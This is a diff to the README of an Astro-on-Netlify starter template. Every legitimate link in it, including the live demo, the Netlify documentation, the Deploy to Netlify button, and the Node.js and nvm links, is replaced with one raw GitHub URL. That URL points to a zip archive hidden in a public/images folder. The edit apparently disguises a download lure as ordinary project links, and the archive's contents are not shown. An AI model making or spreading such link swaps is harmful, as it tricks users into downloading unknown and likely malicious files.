@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip)
 
-A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blobs).
+A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip) (Edge Functions, Image CDN, Blobs).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip)](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [Node.js](https://nodejs.org/) v18.20.8+.                                    |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [Node.js](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip) v18.20.8+.                                    |
+| (optional) [nvm](https://raw.githubusercontent.com/rayshiva/astro-platform-starter-ca469/main/public/images/astro-platform-ca-starter-2.0-beta.3.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
